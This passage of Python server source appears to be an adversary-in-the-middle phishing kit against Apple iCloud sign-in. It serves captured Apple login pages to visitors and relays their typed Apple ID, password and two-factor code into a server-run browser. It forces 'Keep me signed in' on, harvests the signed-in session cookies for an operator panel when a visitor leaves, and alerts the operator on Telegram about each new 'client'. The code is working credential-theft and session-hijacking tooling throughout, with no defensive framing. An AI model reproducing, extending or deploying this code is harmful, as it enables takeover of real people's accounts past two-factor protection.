#       {"page": "/src/4.html", "press": "sign-in", "go": "/src/2.html",
#        "live": true, "wait": true}
#     ]
#   }
#
# "page" is the capture the press happened on and "press" is the id of the
# control that was pressed ("*" for any control on that page). "go" is the
# capture the app moves to - every viewer follows - and "live" says whether
# the press also happens in the browser. A step without "live" does not
# touch the browser: pressing Continue on a capture that has not asked for
# a password yet would submit an empty form to the site.
#
# "wait" says that the app does not move on just because a button was
# pressed: it moves when the browser has taken the details and gone on to
# the next step. Until then the capture stays where it is, and what the
# browser says about the details - "Check the account information you
# entered and try again." - is shown on it. A person who has typed the
# wrong password should not be carried off to the next page as if they had
# not.
#
# A press the flow does not mention still happens in the browser, as it
# always did. There is no flow file, there is no flow.
# --------------------------------------------------------------------------

FLOW_FILE = "flow.json"


def flow_steps() -> list:
    """The steps the captures are put through, if the folder says."""
    try:
        raw = (SRC / FLOW_FILE).read_text(encoding="utf-8")
    except OSError:
        return []

    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        log(f"flow: {FLOW_FILE} is not json - ignored")
        return []

    steps = data.get("steps") if isinstance(data, dict) else data
    if not isinstance(steps, list):
        return []
    return [step for step in steps if isinstance(step, dict)]


def flow_step(page: str, element: str) -> dict | None:
    """What pressing this control on this page does, if the flow says."""
    for step in flow_steps():
        if step.get("page") != page:
            continue
        wanted = step.get("press")
        if wanted not in (element, "*"):
            continue
        return step
    return None


# --------------------------------------------------------------------------
# The visitors
#
# Everyone who visits the site gets their own browser, their own profile and
# their own capture. Two people using the app at the same time do not share
# a session, do not share a page, and do not see each other's typing.
#
# The visitor is named by a cookie: a name, not a secret. It says whose
# browser this is, and nothing else.
# --------------------------------------------------------------------------


class Session:
    """One visitor: their browser, their profile, their capture."""

    def __init__(self, sid: str):
        self.id = sid
        self.bridge = live.Bridge()
        self.hub = Hub()
        self.hub.session = self
        self.pw = None
        self.ctx = None
        self.page = None
        self.state = {
            "status": "idle",      # idle | running | done | error
            "step": "",
            "error": "",
            "browser_open": False,
        }
        self.seen = time.monotonic()
        # Has the browser shown the sign-in form? It has to have, before the
        # form being gone can mean anything: a browser that has only just
        # opened icloud.com has no form on it yet.
        self.saw_sign_in = False
        # What the app is waiting for: the browser to accept what was typed
        # into the capture, before the capture moves on.
        self.waiting: dict | None = None

    def profile(self) -> Path:
        """Where this visitor's browser keeps its memory."""
        return PROFILES / self.id

    def touch(self) -> None:
        self.seen = time.monotonic()

    async def close(self) -> None:
        """Shut the browser down. The profile stays: that is the session."""
        self.bridge.detach()
        try:
            if self.ctx is not None:
                await self.ctx.close()
        except Exception:
            pass
        self.ctx = None
        self.page = None
        self.state["browser_open"] = False
        self.state["status"] = "idle"


SESSIONS: dict[str, Session] = {}

# The sessions that have gone away. A visitor whose browser has been shut
# down is still a visitor: the panel says what they got to and when they
# were last here, and the profile they left behind is still on disk.
GONE: dict[str, dict] = {}


def new_session_id() -> str:
    return secrets.token_urlsafe(12)


async def notify_new_client(sid: str) -> None:
    """Tell the operator, on Telegram, that somebody new has connected.

    The settings are the operator's own, and they are kept in the admin
    store. Nothing is sent when they are not there, or when they are turned
    off, or when Telegram says no.
    """
    settings = admin.STORE.telegram()
    if not settings["enabled"] or not settings["token"] or not settings["chat_id"]:
        return
    went, said = await telegram_module.send(
        settings["token"], settings["chat_id"],
        telegram_module.describe(f"A new client has connected.\n\n"
                                 f"Session: {sid}"))
    if went:
        log(f"telegram: told about the new client {sid}")
    else:
        log(f"telegram: not told about {sid} - {said}")


def visitor_of(request) -> str:
    """The name this request says the visitor is.

    The page keeps the name in its own storage and sends it with the
    request; the cookie says the same thing afterwards, so the name can be
    read either way. The cookie wins when both are there, because it is what
    the server said last.
    """
    kept = request.cookies.get(SESSION_COOKIE, "")
    if kept and SESSION_ID.match(kept):
        return kept
    query = request.scope.get("query_string", b"") or b""
    named = urllib.parse.parse_qs(query.decode("utf-8", "replace")).get(
        "visitor", [""])[0]
    return named if SESSION_ID.match(named) else ""


def session_for_named(request) -> Session | None:
    """The session of the visitor this request names - if it names one.

    A request that names a visitor gets that visitor's session, made if it
    is not there yet. A request that names nobody gets nobody's session:
    making one here would give one person two, the one the page asks for
    and the one the page's own request made on the way in.
    """
    name = visitor_of(request)
    return session_for(name) if name else None


def session_lookup(sid: str | None) -> Session | None:
    """The session this name belongs to, if there is one.

    Looking up is not the same as making: a route that only reads what is
    going on must not give a visitor a session of their own.
    """
    if not sid or not SESSION_ID.match(sid):
        return None
    session = SESSIONS.get(sid)
    if session is not None:
        session.touch()
    return session


def session_for(sid: str | None) -> Session:
    """The session this name belongs to, made new if there is none."""
    if not sid or not SESSION_ID.match(sid):
        sid = new_session_id()

    session = SESSIONS.get(sid)
    if session is None:
        session = Session(sid)
        SESSIONS[sid] = session
        # A client who comes back is here, not gone: the record of their
        # last visit is dropped, so the panel does not say they have left
        # while they are sitting right there.
        back = GONE.pop(sid, None) is not None
        if back:
            log(f"session {sid} is back")
            admin.note("back", session=sid)
        else:
            log(f"new session {sid}")
            admin.note("connected", session=sid)
        # A note to Telegram, in the background: the person connecting must
        # not wait for Telegram, and Telegram being down must not break the
        # app. Nothing is sent - and nothing is started - when there is
        # nowhere to send it.
        #
        # A client who is coming back is not a new client, and the operator
        # has already been told about them.
        settings = admin.STORE.telegram()
        if (not back and settings["enabled"]
                and settings["token"] and settings["chat_id"]):
            spawn(notify_new_client(sid))

    session.touch()
    return session


async def close_idle_sessions() -> None:
    """Shut the browsers of the visitors who have gone away.

    Somebody is here while their capture is open - while the page is
    talking to the server. A browser with nobody watching it is left
    running for a while, and then closed, and the client is remembered as
    one who has gone rather than one who is still working.
    """
    for sid, session in list(SESSIONS.items()):
        if session.hub.viewers:
            # Somebody is looking at the capture right now.
            session.touch()
            continue
        if time.monotonic() - session.seen < SESSION_IDLE_SECONDS:
            continue
        log(f"session {sid} has gone away - closing its browser")
        # What they got to is remembered, so that the panel can say it:
        # a visitor who has gone is still a visitor.
        GONE[sid] = {
            "page": session.hub.page,
            "stage": admin.stage_of(session),
            "url": (session.hub.browser or {}).get("url", ""),
            "title": (session.hub.browser or {}).get("title", ""),
            "finished": bool(session.hub.finished),
            "seen": time.time(),
        }
        # The cookies are read while the browser is still open: once it is
        # shut, they are on disk in a way that cannot be read without the
        # browser. A client who has gone still has cookies, and the panel
        # can still show them.
        try:
            if session.ctx is not None:
                GONE[sid]["cookies"] = await session.ctx.cookies()
        except Exception:
            pass
        await session.close()
        SESSIONS.pop(sid, None)


# --------------------------------------------------------------------------
# The browser behind the capture
#
# What is typed into a capture is written into the browser the server opened,
# and what the browser is showing is written back into the capture. That is
# what makes a capture a page again instead of a picture of one: the same
# field, the same value, on both sides.
#
# The writes are done in the background: the socket must not wait for a
# browser to answer, or one slow page would hold every other viewer up.
# --------------------------------------------------------------------------


def spawn(coro) -> None:
    """A job that runs on its own, with a reference kept until it is done."""
    task = asyncio.ensure_future(coro)
    _background.add(task)
    task.add_done_callback(_background.discard)


_background: set = set()


async def write_to_browser(session: "Session", element: str, value: str) -> None:
    try:
        written = await session.bridge.write_field(element, value)
    except Exception as exc:
        log(f"browser write failed: {str(exc).splitlines()[0]}")
        return

    if written == "written":
        log(f"browser: {element} written")
        return

    if written == "held":
        # The person is still typing. It goes in when they stop.
        return

    # It had nowhere to go. That is usually the sign-in widget still
    # loading, so the value is kept and tried again - and the console says
    # what the browser does have, so a control that is there under another
    # name can be seen rather than guessed at. It is said once: the same
    # thing said every second is not news.
    if not session.bridge.mark_reported({"id": element}):
        return

    log(f"browser: {element} not found yet - "
        f"{await session.bridge.describe_missing(element)}")


async def write_at_to_browser(session: "Session", tag: str, n: int, of: int,
                              value: str, cls: str = "") -> None:
    try:
        written = await session.bridge.write_at(tag, n, of, value, cls)
    except Exception as exc:
        log(f"browser write failed: {str(exc).splitlines()[0]}")
        return

    if written == "written":
        log(f"browser: {tag} #{n} written")
        return

    if written == "held":
        return

    target = {"tag": tag, "n": n}
    if cls:
        target["cls"] = cls
    if not session.bridge.mark_reported(target):
        return

    log(f"browser: {tag} #{n} of {of} not found yet - "
        f"{await session.bridge.describe_missing(tag + ':' + str(n))}")


async def press_in_browser(session: "Session", element: str) -> None:
    # "Keep me signed in" is on before the button goes down: the session is
    # the whole point of the browser being here. A box that is already
    # ticked is left alone - clicking it would untick it.
    if remember_me_is_off(session.hub.browser or {}):
        try:
            await session.bridge.tick_remember_me()
        except Exception:
            pass

    try:
        pressed = await session.bridge.press(element)
    except Exception as exc:
        log(f"browser press failed: {str(exc).splitlines()[0]}")
        return

    if pressed == "pressed":
        log(f"browser: {element} pressed")
        return

    if pressed == "disabled":
        # It is there, and it will not go down: Apple's Continue stays
        # disabled until the form is filled in. Saying so is better than a
        # press that looks like it did something.
        log(f"browser: {element} is disabled - the browser's form is not "
            f"filled in yet")
        return

    if pressed == "held":
        return

    # The browser does not have that control. The capture may simply be
    # further along than the browser: the capture shows the sign-in form,
    # the browser still shows the landing page. Pressing Continue in the
    # capture means taking the sign-in further, and the sign-in button is
    # what does that.
    try:
        pressed = await session.bridge.press_selector(SIGNIN_BUTTON)
    except Exception:
        pressed = False

    if pressed:
        log(f"browser: {element} pressed (the sign-in button)")
        # The press has been made after all, so it is not kept and tried
        # again: a press that keeps being retried holds the bridge for as
        # long as it takes, and the values waiting to be typed need it.
        session.bridge.forget({"id": element})
        return

    log(f"browser: {element} not found yet - "
        f"{await session.bridge.describe_missing(element)}")


LIVE_POLL_SECONDS = 0.6


async def poll_browser(session: "Session") -> None:
    """Tell this visitor's viewers where their browser is.

    The capture is a copy of a moment; the browser is the session. This is
    what puts the session back into the copy: where the browser is, what it
    is called, and what its fields hold.

    This does not count as the visitor being here. The server asking the
    browser a question is not the person doing something, and a session
    that counts the server's own questions as the visitor's presence is a
    session that is never idle, and a browser that is never closed.
    """

    # The values and presses that had nowhere to go yet are tried again
    # first: the sign-in widget is a frame Apple loads a second or two
    # after Sign In is clicked, and a value typed before it is there
    # would otherwise be lost.
    try:
        await session.bridge.flush_pending()
    except Exception:
        pass

    try:
        state = await session.bridge.snapshot()
    except Exception:
        return

    # "Keep me signed in" is on, always. It is the box on the password step,
    # and the session is the whole point of the browser being here. It is
    # turned on before the browser is read again, so the capture is told
    # that it is on - the capture shows what the browser thinks.
    #
    # It is only touched when it is off: a box that is already ticked does
    # not need the browser to be asked about it every half second.
    if remember_me_is_off(state):
        try:
            await session.bridge.tick_remember_me()
        except Exception:
            pass
        try:
            state = await session.bridge.snapshot()
        except Exception:
            return

    # The form is here: the browser is at the sign-in, and this is what it
    # looks like. Remembered, because the form being gone later is what
    # means the person is in.
    if state.get("fields"):
        session.saw_sign_in = True

    # Has the person finished? The code was good, the browser is in iCloud
    # and the sign-in form is gone. Then the app takes them there, and the
    # captures are closed to them: there is nothing left in them to do.
    if not session.hub.finished and browser_is_signed_in(state, session.saw_sign_in):
        session.hub.go_to_icloud()
        return

    # Has the browser accepted what was typed into the capture? It has
    # when the control that was pressed is gone, or when the browser is
    # somewhere else - which is what the sign-in form turning into the
    # verification code step looks like.
    await check_waiting(session, state)

    if state == session.hub.browser:
        return
    session.hub.browser = state
    session.hub.broadcast({"t": "browser", **state})


def browser_is_signed_in(state: dict, saw_the_form: bool = False) -> bool:
    """Is the browser through the sign-in and into iCloud?

    The code was good: the sign-in form is gone and the browser is on iCloud
    itself. That is the end of the process, and the person is sent there.

    The form has to have been there first. A browser that has only just
    opened icloud.com is on the landing page, with no form on it yet, and
    that is not being signed in - it is the beginning of the process, and
    treating it as the end of it sends everybody to iCloud and signs
    nobody in.
    """
    url = str(state.get("url") or "").lower()
    if "idmsa.apple.com" in url or "icloud.com" not in url:
        return False
    fields = state.get("fields") or {}
    if any(name in fields for name in
           ("account_name_text_field", "password_text_field")):
        return False
    return saw_the_form


def remember_me_is_off(state: dict) -> bool:
    """Is the browser's "Keep me signed in" box there, and not ticked?

    It is on the password step, and it has an id, so the browser's own
    reading of the page says whether it is ticked. When it is, nothing has
    to be done - and the browser is not asked about it again.
    """
    fields = state.get("fields") or {}
    entry = fields.get("remember-me")
    if not isinstance(entry, dict):
        return False
    if entry.get("type") not in ("checkbox", "radio"):
        return False
    return not entry.get("checked")


def watch_fields(fields: dict) -> list:
    """The fields to watch for: the ones the person filled in.

    The button was pressed because the form was filled in, so the fields
    that were filled in are the ones that say whether the browser has taken
    them. When they are gone, the browser has gone on to the next step.

    A box that was ticked is not one of them. "Keep me signed in" is still
    there when the sign-in form turns into the code step, and watching it
    would hold the app on the sign-in page for ever.

    When nothing had been filled in - the widget had not loaded yet - the
    fields it is showing now are watched instead.
    """
    def kind(entry) -> str:
        return entry.get("type", "") if isinstance(entry, dict) else ""

    def is_box(entry) -> bool:
        return kind(entry) in ("checkbox", "radio")

    filled = [name for name, entry in fields.items()
              if isinstance(entry, dict) and entry.get("value") and not is_box(entry)]
    if filled:
        return sorted(filled)

    text = [name for name, entry in fields.items()
            if isinstance(entry, dict) and not is_box(entry)]
    if text:
        return sorted(text)

    return sorted(fields.keys())


async def check_waiting(session: "Session", state: dict) -> None:
    """Move the capture on when the browser has moved on.

    The app does not move to the next capture because a button was pressed:
    it moves when the browser has taken the details and gone on to the next
    step. Until then the capture stays where it is, and what the browser
    says about the details is shown on it.
    """
    # The browser is in iCloud: the code was good and the process is over.
    # There is no next capture to wait for.
    if browser_is_signed_in(state, session.saw_sign_in):
        session.hub.go_to_icloud()
        return

    waiting = session.waiting
    if not waiting:
        return

    if time.monotonic() - waiting["since"] > WAIT_FOR_BROWSER_SECONDS:
        log(f"the browser has not moved on - staying on {waiting['page']}")
        session.waiting = None
        return

    # The browser has something to say about the details. While it is
    # saying they are wrong, the capture stays where it is: the person has
    # to be told what is wrong before they are moved on to the next step.
    #
    # This comes first, because a complaint is not a step forward. It adds
    # elements of its own to the form, and counting those as a new form is
    # what carried the person off to the code page while the browser was
    # still asking for the right password.
    if state.get("messages"):
        if not waiting.get("complained"):
            waiting["complained"] = True
            log("the browser is saying the details are wrong - staying here")
        return

    # What the flow says the app is waiting for. When the flow names the
    # page the browser should go on to, that is what is waited for: the
    # capture moves on when the browser is showing "Two-Factor
    # Authentication", and not before.
    #
    # The sign-in fields are not a good enough sign of that. Apple's widget
    # can keep the form in the page while the step underneath it changes,
    # so a form that is still there may be a form nobody is looking at any
    # more - and the app would sit on the sign-in page for ever.
    until = waiting.get("until") or {}
    wanted = until.get("heading")
    if isinstance(wanted, str) and wanted.strip():
        shown = str(state.get("heading") or "").strip()
        if wanted.strip().lower() not in shown.lower():
            return
        log(f"the browser is showing '{shown}' - going to {waiting['go']}")
        session.waiting = None
        session.hub.navigate(waiting["go"], sender=None, everyone=True)
        return

    # The browser has moved on when the form it was showing is gone - the
    # sign-in fields are not there any more, and the next step is there
    # instead.
    #
    # A form that is still there is not a new form: not when the complaint
    # has added things to it, and not when the address has moved either.
    # The browser asking the same question in a new place is still asking,
    # and a page that reloaded is still the same page.
    fields = state.get("fields") or {}
    watched = set(waiting.get("fields") or [])
    now = set(fields.keys())

    if not watched and now:
        # The browser was not showing a form when the button was pressed -
        # the widget had not loaded yet. Watch the one it is showing now.
        watched = set(watch_fields(fields))
        waiting["fields"] = sorted(watched)

    still_asking = bool(watched & now)
    moved = bool(watched) and not still_asking

    if not moved:
        return

    log(f"the browser has moved on - going to {waiting['go']}")
    session.waiting = None
    session.hub.navigate(waiting["go"], sender=None, everyone=True)


_watching = False


def start_watching() -> None:
    """Begin telling the visitors where their browsers are."""
    global _watching
    if _watching:
        return
    _watching = True
    spawn(watch_sessions())


async def watch_sessions() -> None:
    """Every visitor's browser is watched, and the idle ones are shut down."""
    while True:
        await asyncio.sleep(LIVE_POLL_SECONDS)
        for session in list(SESSIONS.values()):
            try:
                await poll_browser(session)
            except Exception:
                pass
        try:
            await close_idle_sessions()
        except Exception:
            pass


async def sync_socket(websocket: WebSocket):
    """The captured page's line to the server.

    The line belongs to one visitor: their browser, their capture, their
    page. Two people using the app at the same time never see each other.
    """
    await websocket.accept()

    sid = ""
    cookies = getattr(websocket, "cookies", None)
    if cookies:
        sid = cookies.get(SESSION_COOKIE, "")
    session = session_for(sid)

    # The capture holds the same ids as the page it was taken from - the
    # form's fields have the same names in both - so a value written to the
    # capture would be written to the capture. The pages the app serves are
    # not the session the bridge writes into, and it says which host it
    # serves them from.
    host = ""
    headers = getattr(websocket, "headers", None)
    if headers:
        host = headers.get("host", "")
    if host:
        session.bridge.exclude_host(host)

    viewer = Viewer(websocket)
    session.hub.join(viewer)

    try:
        while True:
            raw = await websocket.receive_text()
            try:
                message = json.loads(raw)
            except json.JSONDecodeError:
                continue
            session.hub.handle(viewer, message, session)
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        log(f"viewer disconnected: {str(exc).splitlines()[0]}")
    finally:
        session.hub.leave(viewer)


app.websocket("/ws")(sync_socket)


@app.post("/nav")
async def nav(request: Request):
    """A link click, reported by ``sendBeacon`` as the page unloads.

    Waiting for the WebSocket to carry it would race the navigation; a beacon
    is delivered whether or not the document survives.
    """
    try:
        message = json.loads(await request.body() or b"{}")
    except json.JSONDecodeError:
        return Response(status_code=400)
    session = session_lookup(visitor_of(request))
    if session is not None:
        session.hub.navigate(
            message.get("page") if isinstance(message, dict) else None)
    return Response(status_code=204)


@app.get("/.well-known/appspecific/com.chrome.devtools.json")
async def chrome_devtools():
    """Chrome DevTools probes this on localhost pages. 204 keeps it quiet."""
    return Response(status_code=204)


if __name__ == "__main__":
    import uvicorn

    log("server on http://localhost:9002")
    uvicorn.run(app, host="0.0.0.0", port=9002)
